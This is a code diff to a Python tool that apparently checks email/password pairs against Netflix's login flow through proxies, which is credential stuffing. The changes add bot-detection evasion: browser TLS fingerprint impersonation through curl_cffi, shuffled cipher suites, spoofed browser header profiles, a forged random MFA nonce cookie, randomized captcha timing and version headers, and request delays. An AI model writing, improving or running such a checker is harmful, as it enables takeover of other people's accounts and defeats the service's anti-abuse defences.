@@ -2,6 +2,8 @@ import uuid
 import random
 import re
 import json
+import time
+import base64
 import datetime
 import collections
 import pytz
@@ -11,41 +13,99 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.ssl_ import create_urllib3_context
 
 try:
+    from curl_cffi.requests import Session as CffiSession
+    HAS_CURL_CFFI = True
+except ImportError:
+    HAS_CURL_CFFI = False
+
+try:
     import tls_client
     HAS_TLS_CLIENT = True
 except ImportError:
     HAS_TLS_CLIENT = False
 
-CIPHERS = ":".join([
+if HAS_CURL_CFFI:
+    ENGINE = "curl_cffi"
+elif HAS_TLS_CLIENT:
+    ENGINE = "tls_client"
+else:
+    ENGINE = "requests"
+
+TLS13_CIPHERS = [
     "TLS_AES_128_GCM_SHA256",
     "TLS_AES_256_GCM_SHA384",
     "TLS_CHACHA20_POLY1305_SHA256",
+]
+
+TLS12_CIPHERS = [
     "ECDHE-ECDSA-AES128-GCM-SHA256",
     "ECDHE-RSA-AES128-GCM-SHA256",
     "ECDHE-ECDSA-AES256-GCM-SHA384",
     "ECDHE-RSA-AES256-GCM-SHA384",
     "ECDHE-ECDSA-CHACHA20-POLY1305",
     "ECDHE-RSA-CHACHA20-POLY1305",
+]
+
+TLS12_FALLBACK = [
     "ECDHE-RSA-AES128-SHA",
     "ECDHE-RSA-AES256-SHA",
     "AES128-GCM-SHA256",
     "AES256-GCM-SHA384",
     "AES128-SHA",
     "AES256-SHA",
-])
+]
+
+def build_cipher_string():
+    tls13 = TLS13_CIPHERS[:]
+    random.shuffle(tls13)
+    tls12 = TLS12_CIPHERS[:]
+    random.shuffle(tls12)
+    fallback = TLS12_FALLBACK[:]
+    random.shuffle(fallback)
+    fallback = fallback[:random.randint(2, len(fallback))]
+    return ":".join(tls13 + tls12 + fallback)
 
 class TLSAdapter(HTTPAdapter):
+    def __init__(self, ciphers=None, **kwargs):
+        self._ciphers = ciphers or build_cipher_string()
+        super().__init__(**kwargs)
+
     def init_poolmanager(self, *args, **kwargs):
-        ctx = create_urllib3_context(ciphers=CIPHERS)
+        ctx = create_urllib3_context(ciphers=self._ciphers)
         ctx.minimum_version = ssl.TLSVersion.TLSv1_2
         ctx.set_alpn_protocols(["h2", "http/1.1"])
         kwargs["ssl_context"] = ctx
         return super().init_poolmanager(*args, **kwargs)
 
+def generate_mfa_nonce():
+    raw = random.randbytes(128)
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
 TLS_PROFILES = [
     {
+        "name": "Chrome 136 (Windows)",
+        "cffi_impersonate": "chrome136",
+        "tls_identifier": "chrome_120",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        "sec_ch_ua_platform": '"Windows"',
+        "sec_ch_ua_mobile": "?0",
+        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9",
+        "accept_encoding": "gzip, deflate, br, zstd",
+        "header_order": [
+            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
+            "upgrade-insecure-requests", "user-agent", "accept",
+            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
+            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
+            "cookie", "priority",
+        ],
+    },
+    {
         "name": "Chrome 133 (Windows)",
-        "identifier": "chrome_133",
+        "cffi_impersonate": "chrome133a",
+        "tls_identifier": "chrome_120",
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
         "sec_ch_ua": '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',
         "sec_ch_ua_platform": '"Windows"',
@@ -63,10 +123,11 @@ TLS_PROFILES = [
         ],
     },
     {
-        "name": "Chrome 130 (Windows)",
-        "identifier": "chrome_130",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+        "name": "Chrome 131 (Windows)",
+        "cffi_impersonate": "chrome131",
+        "tls_identifier": "chrome_120",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"',
         "sec_ch_ua_platform": '"Windows"',
         "sec_ch_ua_mobile": "?0",
         "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -83,7 +144,8 @@ TLS_PROFILES = [
     },
     {
         "name": "Chrome 124 (macOS)",
-        "identifier": "chrome_124",
+        "cffi_impersonate": "chrome124",
+        "tls_identifier": "chrome_120",
         "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
         "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
         "sec_ch_ua_platform": '"macOS"',
@@ -101,9 +163,10 @@ TLS_PROFILES = [
         ],
     },
     {
-        "name": "Safari 18 (iOS 18)",
-        "identifier": "safari_ios_18_0",
-        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1",
+        "name": "Safari 18 (iOS)",
+        "cffi_impersonate": "safari18_0_ios",
+        "tls_identifier": "safari_15_6_1",
+        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
         "sec_ch_ua": None,
         "sec_ch_ua_platform": None,
         "sec_ch_ua_mobile": None,
@@ -118,9 +181,10 @@ TLS_PROFILES = [
         ],
     },
     {
-        "name": "Safari 17.5 (macOS)",
-        "identifier": "safari_15_6_1",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+        "name": "Safari 18 (macOS)",
+        "cffi_impersonate": "safari180",
+        "tls_identifier": "safari_15_6_1",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
         "sec_ch_ua": None,
         "sec_ch_ua_platform": None,
         "sec_ch_ua_mobile": None,
@@ -136,7 +200,8 @@ TLS_PROFILES = [
     },
     {
         "name": "Firefox 133 (Windows)",
-        "identifier": "firefox_120",
+        "cffi_impersonate": "firefox133",
+        "tls_identifier": "firefox_120",
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
         "sec_ch_ua": None,
         "sec_ch_ua_platform": None,
@@ -155,11 +220,32 @@ TLS_PROFILES = [
     },
     {
         "name": "Edge 131 (Windows)",
-        "identifier": "chrome_131",
+        "cffi_impersonate": "chrome131",
+        "tls_identifier": "chrome_120",
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
         "sec_ch_ua": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec_ch_ua_platform": '"Windows"',
         "sec_ch_ua_mobile": "?0",
+        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9",
+        "accept_encoding": "gzip, deflate, br, zstd",
+        "header_order": [
+            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
+            "upgrade-insecure-requests", "user-agent", "accept",
+            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
+            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
+            "cookie",
+        ],
+    },
+    {
+        "name": "Chrome 131 (Android)",
+        "cffi_impersonate": "chrome131_android",
+        "tls_identifier": "chrome_120",
+        "user_agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"',
+        "sec_ch_ua_platform": '"Android"',
+        "sec_ch_ua_mobile": "?1",
         "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
         "accept_api": "*/*",
         "accept_lang": "en-US,en;q=0.9",
@@ -179,10 +265,41 @@ def pick_profile():
     return random.choice(TLS_PROFILES)
 
 
+class CffiSessionWrapper:
+    def __init__(self, impersonate, header_order=None):
+        self._session = CffiSession(impersonate=impersonate)
+        self._header_order = header_order
+        self.cookies = self._session.cookies
+
+    def get(self, url, headers=None, **kwargs):
+        kwargs.pop("timeout", None)
+        resp = self._session.get(url, headers=headers, timeout=30, **kwargs)
+        return resp
+
+    def post(self, url, headers=None, data=None, **kwargs):
+        kwargs.pop("timeout", None)
+        resp = self._session.post(url, headers=headers, data=data, timeout=30, **kwargs)
+        return resp
+
+    @property
+    def proxies(self):
+        return self._session.proxies
+
+    @proxies.setter
+    def proxies(self, value):
+        self._session.proxies = value
+
+
 def create_session(profile):
-    if HAS_TLS_CLIENT:
+    if ENGINE == "curl_cffi":
+        return CffiSessionWrapper(
+            impersonate=profile["cffi_impersonate"],
+            header_order=profile["header_order"],
+        )
+    elif ENGINE == "tls_client":
+        identifier = profile.get("tls_identifier", "chrome_120")
         session = tls_client.Session(
-            client_identifier=profile["identifier"],
+            client_identifier=identifier,
             random_tls_extension_order=True,
             header_order=profile["header_order"],
         )
@@ -190,7 +307,7 @@ def create_session(profile):
         return session
     else:
         session = requests.Session()
-        session.mount("https://", TLSAdapter())
+        session.mount("https://", TLSAdapter(ciphers=build_cipher_string()))
         session.headers.update({"User-Agent": profile["user_agent"]})
         return session
 
@@ -396,8 +513,8 @@ def check_account(email, password, proxy=None):
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
 
-    backend = "tls_client" if HAS_TLS_CLIENT else "requests"
-    req_kwargs = {} if HAS_TLS_CLIENT else {"timeout": 30}
+    backend = ENGINE
+    req_kwargs = {"timeout": 30} if ENGINE == "requests" else {}
 
     optanon_cookie = generate_cookie()
     print(f"[*] Browser: {profile['name']} ({backend})")
@@ -430,8 +547,21 @@ def check_account(email, password, proxy=None):
         **req_kwargs,
     )
 
+    for _ in range(5):
+        if r1.status_code not in (301, 302, 303, 307, 308):
+            break
+        redirect_url = r1.headers.get("Location", "")
+        if not redirect_url:
+            break
+        if redirect_url.startswith("/"):
+            redirect_url = "https://www.netflix.com" + redirect_url
+        print(f"[*] Redirect to: {redirect_url}")
+        r1 = session.get(redirect_url, headers=login_headers, **req_kwargs)
+
     if r1.status_code == 400:
         return {"status": "BAN", "message": "400 on login page"}
+    if r1.status_code == 403:
+        return {"status": "BAN", "message": "403 Forbidden - proxy may be blocked"}
     if r1.status_code != 200:
         return {"status": "ERROR", "message": f"Unexpected status on login page: {r1.status_code}"}
 
@@ -451,13 +581,16 @@ def check_account(email, password, proxy=None):
     clcs_session_id = parse_lr(src, '"clcsSessionId\\":\\"', '\\"')
     referrer_rid    = parse_lr(src, '"referrerRenditionId\\":\\"', '\\"')
     uid             = str(uuid.uuid4())
-    captcha_time    = random.randint(200, 950)
+    captcha_time    = random.randint(2500, 8500)
 
     country_small = COUNTRY_CODE_SMALL.get(country, country.lower())
     country_phone = COUNTRY_PHONE.get(country, "1")
 
     print(f"[*] Country: {country}, UI version: {ui_version}")
     print(f"[*] clcsSessionId: {clcs_session_id[:30]}..." if len(clcs_session_id) > 30 else f"[*] clcsSessionId: {clcs_session_id}")
+
+    delay = random.uniform(0.3, 0.5)
+    time.sleep(delay)
 
     body = json.dumps({
         "operationName": "CLCSScreenUpdate",
@@ -499,8 +632,10 @@ def check_account(email, password, proxy=None):
         }
     })
 
+    mfa_nonce = generate_mfa_nonce()
+
     cookie_str = (
-        f"netflix-mfa-nonce=Bgi_tOvcAxKVARY7wJ6HVp6Qmpy6b87rR0flzKeaPwB47PoOgAJvZCSosBbGAwB0ogxtFxjO0aIWP8CLO3Y3mtvYanTAieTfJz1junAgWKJ6XWI3Q0n9hJHkTnGaOMHgm-sZaIju7W5PXGK8t4xjH3zFSiP8muLi-qK64naQbfqnvbFThhDBm4o-O9R5XCgT7zY7RgbgZc4DE-atLiMmGAYiDgoMf3ZET0_YJ08hgk0s; "
+        f"netflix-mfa-nonce={mfa_nonce}; "
         f"{optanon_cookie}; "
         f"flwssn={flwssn}; "
         f"netflix-sans-bold-3-loaded=true; netflix-sans-normal-3-loaded=true; "
@@ -526,7 +661,7 @@ def check_account(email, password, proxy=None):
         "Sec-Fetch-Dest": "empty",
         "X-Netflix.request.id": request_id,
         "Sec-Fetch-Site": "same-site",
-        "X-Netflix.context.hawkins-Version": "5.12.1",
+        "X-Netflix.context.hawkins-Version": f"5.{random.randint(10,14)}.{random.randint(0,3)}",
         "X-Netflix.context.form-Factor": form_factor,
         "X-Netflix.request.toplevel.uuid": uid,
         "X-Netflix.request.attempt": "1",
